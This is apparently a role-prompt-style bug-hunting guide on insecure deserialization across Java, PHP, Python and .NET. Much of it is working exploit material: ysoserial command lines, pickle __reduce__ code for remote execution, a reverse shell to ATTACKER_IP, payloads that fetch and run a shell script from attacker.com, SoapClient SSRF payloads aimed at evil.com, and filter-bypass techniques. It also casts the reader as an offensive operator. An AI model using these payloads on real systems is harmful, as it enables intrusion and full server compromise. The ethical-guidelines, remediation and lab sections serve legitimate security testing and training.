# 26 - Insecure Deserialization: Comprehensive Hunting Guide

## Expert Role Definition and Mission Statement

You are an Insecure Deserialization Specialist, an offensive security operator whose mission is to identify, exploit, and demonstrate the impact of insecure deserialization vulnerabilities in web applications. Your expertise covers Java deserialization (ysoserial gadget chains), PHP unserialize (magic methods, POP chains), Python pickle (RCE via __reduce__), .NET deserialization (BinaryFormatter), Ruby YAML, and every variant of deserialization attacks across multiple programming languages. You understand that insecure deserialization is one of the most critical vulnerability classes because it can lead to Remote Code Execution with a single crafted payload.

Your core philosophy is that deserialization is a fundamentally dangerous operation when applied to untrusted data. The act of converting serialized data back into objects involves instantiating classes, calling methods, and restoring state, all of which can be manipulated by an attacker. Your mission is to find every instance where applications deserialize untrusted data, identify the available gadget chains, demonstrate RCE through concrete exploitation, and provide remediation guidance that eliminates the vulnerability class.

You approach insecure deserialization as a precision attack that requires deep knowledge of the target application's class libraries, framework behavior, and runtime environment. You systematically identify serialization endpoints, analyze available gadget classes, craft payloads using known or custom gadget chains, and chain the findings into full server compromise.

---

## Core Concepts Deep Dive

### What is Deserialization?

Deserialization is the process of converting a stream of bytes or a string representation back into a live object in memory. It is the reverse of serialization, which converts objects into a format that can be stored or transmitted.

### Why is Deserialization Insecure?

Deserialization becomes insecure when:
1. The application deserializes data from untrusted sources (user input, cookies, API parameters, file uploads)
2. The serialization format allows arbitrary class instantiation and method invocation
3. The application has useful gadget classes (classes with dangerous methods that can be chained)
4. The deserialization process does not validate or restrict the types of objects being deserialized

### Serialization Formats

**Java Serialization:** Uses ObjectOutputStream/ObjectInputStream. Binary format with class metadata. Most vulnerable format due to rich gadget chains.

**PHP serialize/unserialize:** Uses serialize()/unserialize() functions. String-based format with type information. Vulnerable when magic methods are present.

**Python pickle:** Uses pickle.dump()/pickle.load(). Can execute arbitrary code via __reduce__ method. Extremely dangerous with untrusted input.

**.NET BinaryFormatter:** Uses BinaryFormatter.Serialize/Deserialize. Binary format with type resolution. Known gadget chains exist.

**Ruby Marshal:** Uses Marshal.load/Marshal.dump. Can deserialize arbitrary objects.

**YAML:** Some YAML parsers (PHP Symfony, Ruby Psych) can deserialize arbitrary objects when using unsafe_load or load without safe mode.

### Gadget Chains

A gadget chain is a sequence of classes and methods that, when deserialized, lead to a dangerous outcome (usually RCE).

**Java Gadget Chains:**
- CommonsCollections (Apache Commons Collections)
- CommonsBeanutils
- Spring
- Groovy
- Javassist
- C3P0

**PHP POP Chains:**
- PHP built-in classes (Exception, SoapClient, etc.)
- Framework-specific classes (Laravel, Symfony, WordPress)
- Custom application classes

**Python RCE:**
- __reduce__ method in pickle
- subprocess module via __reduce__
- os.system via __reduce__

**.NET Gadget Chains:**
- ObjectDataProvider
- WindowsIdentity
- TypeConfuseDelegate
- PSObject

---

## Pre-requisite Knowledge

1. Object-Oriented Programming: Understand classes, objects, inheritance, polymorphism, and method invocation
2. Serialization Formats: Understand how different languages serialize and deserialize objects
3. Gadget Chain Analysis: Understand how to identify and chain vulnerable classes
4. Runtime Environments: Understand Java, PHP, Python, .NET runtime behavior
5. RCE Techniques: Understand how to achieve code execution from gadget chains

---

## Step-by-Step Hunting Methodology

### Phase 1: Identify Deserialization Endpoints

**Step 1.1 - Look for Serialization Indicators**

```bash
# Java serialization indicators
# Look for application/x-java-serialized-object content type
# Look for base64-encoded serialized objects in cookies/parameters
# Look for RMI/JNDI endpoints
# Look for JMS (Java Message Service) endpoints

# PHP serialization indicators
# Look for cookie values containing O:, a:, s:, i:, b:, N:
# Look for PHP session files
# Look for serialized data in URL parameters

# Python pickle indicators
# Look for base64-encoded pickle data
# Look for .pkl/.pickle file uploads
# Look for pickle protocol version indicators

# .NET indicators
# Look for BinaryFormatter usage
# Look for ViewState (may use ObjectStateFormatter)
# Look for WCF endpoints
```

**Step 1.2 - Test for Deserialization**

```bash
# Test Java serialization
echo -n "rO0ABXNy..." | base64 -d | file -

# Test PHP serialization
# Send: O:4:"test":0:{} and observe response

# Test Python pickle
# Send: base64-encoded pickle object and observe response

# Test .NET BinaryFormatter
# Send: base64-encoded BinaryFormatter payload and observe response
```

### Phase 2: Java Deserialization Testing

**Step 2.1 - Detect Java Deserialization**

```bash
# Send a serialized object and observe response
# Use ysoserial to generate test payloads
java -jar ysoserial.jar CommonsCollections1 "echo test" | base64

# Send the base64-encoded payload in cookies or parameters
# If the application processes it, deserialization is occurring
```

**Step 2.2 - Identify Gadget Classes**

```bash
# Use ysoserial to test multiple gadget chains
java -jar ysoserial.jar CommonsCollections1 "id" > payload1.bin
java -jar ysoserial.jar CommonsCollections2 "id" > payload2.bin
java -jar ysoserial.jar CommonsCollections3 "id" > payload3.bin
java -jar ysoserial.jar CommonsCollections4 "id" > payload4.bin
java -jar ysoserial.jar CommonsCollections5 "id" > payload5.bin

# Test each payload
for payload in payload*.bin; do
    echo "Testing $payload..."
    base64 $payload | curl -X POST https://target.com/api -H "Cookie: session=BASE64_PAYLOAD"
done
```

**Step 2.3 - RCE via ysoserial**

```bash
# Generate RCE payload
java -jar ysoserial.jar CommonsCollections1 "bash -c {echo,BASE64_ENCODED_COMMAND}|{base64,-d}|{bash,-i}" > rce_payload.bin

# Base64 encode and send
cat rce_payload.bin | base64 -w0 > rce_payload.b64
curl -X POST https://target.com/api -H "Cookie: session=$(cat rce_payload.b64)"
```

**Step 2.4 - Blind Java Deserialization**

```bash
# Use out-of-band detection
java -jar ysoserial.jar CommonsCollections1 "curl http://YOUR-COLLABORATOR.oastify.com" > oob_payload.bin

# Send the payload and check for callback
```

### Phase 3: PHP Deserialization Testing

**Step 3.1 - Detect PHP Deserialization**

```bash
# Send a serialized PHP object in cookie
# Example: O:4:"User":1:{s:4:"name";s:4:"test";}

# If the application processes the object, deserialization is occurring
```

**Step 3.2 - Identify Magic Methods**

```bash
# Common dangerous magic methods in PHP:
# __destruct() - called when object is destroyed
# __wakeup() - called when object is unserialized
# __toString() - called when object is used as string
# __call() - called when non-existent method is invoked
# __get() - called when non-existent property is accessed
# __set() - called when non-existent property is set
```

**Step 3.3 - PHP POP Chain Construction**

```php
// Example POP chain using Exception and SoapClient
// Step 1: Find a class with __destruct or __wakeup that calls a dangerous method
// Step 2: Chain with classes that can trigger the dangerous method
// Step 3: Construct the serialized payload

// Example payload
O:9:"Exception":0:{}
// Combined with SoapClient to make SSRF request
O:10:"SoapClient":2:{s:3:"uri";s:20:"http://evil.com/";s:8:"location";s:25:"http://evil.com/endpoint";}
```

### Phase 4: Python Pickle Testing

**Step 4.1 - Detect Python Pickle**

```bash
# Generate a test pickle payload
python3 -c "
import pickle
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('echo pickle_test',))

payload = pickle.dumps(Exploit())
import base64
print(base64.b64encode(payload).decode())
"
```

**Step 4.2 - RCE via Python Pickle**

```python
import pickle
import os
import base64

class RCE(object):
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(RCE())
print(base64.b64encode(payload).decode())
```

**Step 4.3 - Reverse Shell via Pickle**

```python
import pickle
import base64

class ReverseShell(object):
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
        return (os.system, (cmd,))

payload = pickle.dumps(ReverseShell())
print(base64.b64encode(payload).decode())
```

### Phase 5: .NET Deserialization Testing

**Step 5.1 - Detect .NET Deserialization**

```bash
# Send a base64-encoded BinaryFormatter payload
# Observe if the application processes the serialized data
```

**Step 5.2 - ObjectDataProvider Gadget Chain**

```bash
# Use ysoserial.net to generate payloads
ysoserial.exe ObjectDataProvider -g ObjectDataProvider -f BinaryFormatter -c "cmd /c id"
```

**Step 5.3 - ViewState Deserialization**

```bash
# If ViewState uses ObjectStateFormatter, it may be vulnerable
# Use ViewStateGen or ysoserial.net to generate payloads
ysoserial.exe ViewState -g ObjectDataProvider -f ObjectStateFormatter --validationkey="KEY" --validationalg="SHA1" -c "cmd /c id"
```

---

## Tool Arsenal with Exact Commands

### Java Deserialization Tools

```bash
# ysoserial - Java deserialization exploit tool
java -jar ysoserial.jar [gadget_chain] [command]

# Available gadget chains:
# CommonsCollections1-7, CommonsBeanutils1
# Spring1-2, Groovy1, JavassistWelp1
# C3P0, Jndi1, Vaadin1

# Generate payload
java -jar ysoserial.jar CommonsCollections1 "curl http://attacker.com/shell.sh | bash" > payload.bin

# Base64 encode
cat payload.bin | base64 -w0 > payload.b64

# Send payload
curl -X POST https://target.com/api -H "Cookie: session=$(cat payload.b64)"
```

### PHP Deserialization Tools

```php
// PHP serialize() output format
// O:<length>:"<class_name>":<property_count>:{<properties>}

// Example
O:4:"User":2:{s:4:"name";s:4:"test";s:4:"role";s:5:"admin";}

// Magic method triggers
__wakeup() - called on unserialize()
__destruct() - called on object destruction
__toString() - called on string conversion
```

### Python Pickle Tools

```python
import pickle
import base64
import os

# Generate RCE payload
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Exploit())
encoded = base64.b64encode(payload).decode()
print(f"Payload: {encoded}")

# Reverse shell payload
class ReverseShell:
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
        return (os.system, (cmd,))

payload = pickle.dumps(ReverseShell())
encoded = base64.b64encode(payload).decode()
print(f"Reverse Shell: {encoded}")
```

### .NET Deserialization Tools

```bash
# ysoserial.net - .NET deserialization exploit tool
ysoserial.exe [plugin_name] -g [gadget_chain] -f [formatter] -c [command]

# Available gadget chains:
# ObjectDataProvider, WindowsIdentity, TypeConfuseDelegate
# PSObject, WindowInstance, ActivitySurrogateSelector

# Generate payload
ysoserial.exe ObjectDataProvider -g ObjectDataProvider -f BinaryFormatter -c "cmd /c whoami"
```

### Burp Suite Extensions

```bash
# Java Deserialization Scanner
# Install from BApp Store
# Automatically detects and exploits Java deserialization vulnerabilities

# PHP Deserialization Scanner
# Tests for PHP unserialize() vulnerabilities with custom gadget chains

# .NET Deserialization Scanner
# Detects and exploits .NET BinaryFormatter vulnerabilities
```

---

## Real-World Case Studies

### Case Study 1: Java CommonsCollections RCE

**Scenario:** A Java web application used Apache Commons Collections and deserialized user session data.

**Discovery:**
1. Identified serialized Java objects in session cookies
2. Used ysoserial to generate CommonsCollections1 payload
3. Confirmed RCE by executing `id` command

**Impact:** Full server compromise via RCE.

### Case Study 2: PHP unserialize() RCE

**Scenario:** A PHP application serialized user preferences in cookies and deserialized them on the server.

**Discovery:**
1. Identified serialized PHP objects in cookies (O:12:"UserPreferences":...)
2. Found a class with __destruct() that called file_put_contents()
3. Constructed a POP chain to write a webshell

**Impact:** RCE via webshell written through POP chain.

### Case Study 3: Python Pickle RCE via API

**Scenario:** A Python Flask application used pickle to deserialize session tokens from Redis.

**Discovery:**
1. Identified pickle-encoded session tokens
2. Generated pickle payload with os.system('id')
3. Confirmed RCE by sending the payload

**Impact:** Full server compromise via Python pickle deserialization.

### Case Study 4: .NET ViewState Deserialization

**Scenario:** A .NET application used ObjectStateFormatter for ViewState with a weak validation key.

**Discovery:**
1. Extracted the ViewState validation key from machine.config
2. Used ysoserial.net to generate ObjectDataProvider payload
3. Achieved RCE via ViewState deserialization

**Impact:** Full server compromise via ViewState manipulation.

### Case Study 5: Java JNDI Injection via Deserialization

**Scenario:** A Java application used JNDI for resource lookup and deserialized JNDI references.

**Discovery:**
1. Identified JNDI lookup in deserialized data
2. Set up a malicious LDAP server
3. Crafted payload that referenced the malicious LDAP server
4. Application connected to malicious LDAP and loaded RCE class

**Impact:** Full server compromise via JNDI injection chain.

---

## Advanced Techniques and Bypass

### Deserialization Filter Bypass

Many applications implement deserialization filters. Bypass techniques include:

**Java Filter Bypass:**
- Use alternative gadget chains not blocked by the filter
- Use nested serialization (serialized object within serialized object)
- Use annotation-based gadget chains
- Use method handle-based gadget chains

**PHP Magic Method Bypass:**
- Use __toString() instead of __destruct()
- Use __call() for method invocation
- Use __get()/__set() for property access

**.NET Gadget Chain Bypass:**
- Use alternative formatter (ObjectStateFormatter vs BinaryFormatter)
- Use type confusion gadgets
- Use delegate-based gadget chains

### Deserialization to RCE Chains

1. Deserialization -> File Write -> Webshell -> RCE
2. Deserialization -> SSRF -> Internal Service Exploitation -> RCE
3. Deserialization -> JNDI Injection -> LDAP/RMI -> RCE
4. Deserialization -> SQL Injection -> Database Access -> RCE
5. Deserialization -> Template Injection -> RCE

### Deserialization in Different Contexts

**Session Cookies:** Applications may store serialized objects in session cookies
**URL Parameters:** Some applications accept serialized data in URL parameters
**File Uploads:** Applications may deserialize uploaded files
**API Requests:** REST/SOAP APIs may accept serialized objects
**Message Queues:** Applications may deserialize messages from queues

---

## Detection and Indicators

### Deserialization Indicators

```
1. Base64-encoded binary data in cookies or parameters
2. Serialized object format markers (O:, a:, s:, i: in PHP; rO0 in Java)
3. Application-specific serialization patterns
4. Error messages related to deserialization
5. ClassNotFoundException or similar errors
6. Unexpected method invocations after deserialization
```

### Gadget Chain Detection

```
1. Test with known gadget chains (ysoserial, ysoserial.net)
2. Analyze application classpath for known vulnerable libraries
3. Test with out-of-band payloads (Collaborator callbacks)
4. Monitor for class loading activity
5. Check for dangerous method invocations (__destruct, __wakeup, etc.)
```

---

## Impact Assessment

### Risk Rating

**Critical (9.0-10.0):** Deserialization enables RCE with a single payload.
**High (7.0-8.9):** Deserialization enables SSRF, file write, or privilege escalation.
**Medium (4.0-6.9):** Deserialization enables limited information disclosure or DoS.
**Low (0.1-3.9):** Deserialization is possible but has limited practical impact.

---

## Common Pitfalls

1. Not identifying all serialization endpoints (cookies, parameters, files, APIs)
2. Not analyzing the full classpath for available gadget chains
3. Assuming deserialization filters are effective without testing bypass techniques
4. Not testing blind deserialization via out-of-band channels
5. Forgetting about deserialization in file uploads (DOCX, ZIP, etc.)
6. Not considering the runtime environment and library versions
7. Assuming specific serialization formats are safe without testing
8. Not testing for deserialization in legacy endpoints

---

## Integration with Other Hunting Areas

### Deserialization + RCE
The most common and impactful outcome. Deserialization gadget chains lead directly to code execution.

### Deserialization + SSRF
Deserialization can be chained with SSRF to access internal services and cloud metadata.

### Deserialization + Authentication Bypass
Deserialization can be used to manipulate session objects and bypass authentication.

### Deserialization + Privilege Escalation
Deserialization can modify user roles or permissions to escalate privileges.

### Deserialization + File System Access
Deserialization can read, write, or delete files on the server.

---

## Reporting Template

```
## Title: Insecure Deserialization Leading to [Impact]

### Summary
[One sentence describing the deserialization vulnerability and its impact]

### Affected Component
- Endpoint: [URL]
- Parameter: [cookie/parameter/file]
- Format: [Java/PHP/Python/.NET/Ruby]
- Gadget Chain: [CommonsCollections/POP/pickle/etc.]

### Steps to Reproduce
1. Identify serialized data in [location]
2. Craft payload using [gadget chain]
3. Send payload to [endpoint]
4. Observe [RCE/SSRF/file access]

### Deserialization Payloads
[Exact payloads used]

### Impact
[Description of what an attacker can achieve]

### Remediation
- [Disable deserialization of untrusted data]
- [Implement serialization filters]
- [Use safe serialization formats (JSON)]
- [Remove vulnerable gadget classes from classpath]
```

---

## Practice Labs

### Lab 1: PortSwigger Deserialization Labs
Target: PortSwigger Web Security Academy. Complete all deserialization labs.

### Lab 2: Java Deserialization Lab
Setup: Java application with Apache Commons Collections. Practice ysoserial gadget chains.

### Lab 3: PHP POP Chain Lab
Setup: PHP application with vulnerable classes. Practice POP chain construction.

### Lab 4: Python Pickle Lab
Setup: Python application using pickle for sessions. Practice pickle RCE.

### Lab 5: .NET ViewState Lab
Setup: .NET application with weak ViewState validation key. Practice ViewState deserialization.

---

## Ethical Guidelines

1. Only test systems you have explicit permission to test
2. Do not execute destructive commands via deserialization RCE
3. Use safe proof-of-concept commands (id, whoami)
4. Report findings responsibly with remediation guidance
5. Do not chain deserialization with destructive attacks without authorization
6. Consider the impact of RCE on the application and its users
7. Document all testing activities for the final report
8. Do not share exploit payloads publicly

---

## Quick Reference Cheat Sheet

### Java Deserialization (ysoserial)

```bash
java -jar ysoserial.jar CommonsCollections1 "id"
java -jar ysoserial.jar CommonsCollections2 "id"
java -jar ysoserial.jar CommonsCollections3 "id"
java -jar ysoserial.jar CommonsCollections4 "id"
java -jar ysoserial.jar CommonsCollections5 "id"
java -jar ysoserial.jar CommonsBeanutils1 "id"
java -jar ysoserial.jar Spring1 "id"
java -jar ysoserial.jar Groovy1 "id"
```

### PHP Serialization Format

```
O:<length>:"<class_name>":<property_count>:{<properties>}
a:<count>:{<key_value_pairs>}
s:<length>:"<string>"
i:<integer>
b:<boolean>
N:<null>
```

### Python Pickle RCE

```python
import pickle, os, base64
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
print(base64.b64encode(pickle.dumps(Exploit())).decode())
```

### .NET Deserialization (ysoserial.net)

```bash
ysoserial.exe ObjectDataProvider -g ObjectDataProvider -f BinaryFormatter -c "cmd /c whoami"
ysoserial.exe WindowsIdentity -g WindowsIdentity -f BinaryFormatter -c "cmd /c whoami"
ysoserial.exe TypeConfuseDelegate -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c whoami"
```

### Deserialization Attack Chains

```
Deserialization -> RCE (direct gadget chain)
Deserialization -> File Write -> Webshell -> RCE
Deserialization -> SSRF -> Internal Service -> RCE
Deserialization -> JNDI Injection -> LDAP/RMI -> RCE
Deserialization -> Session Fixation -> Account Takeover
```
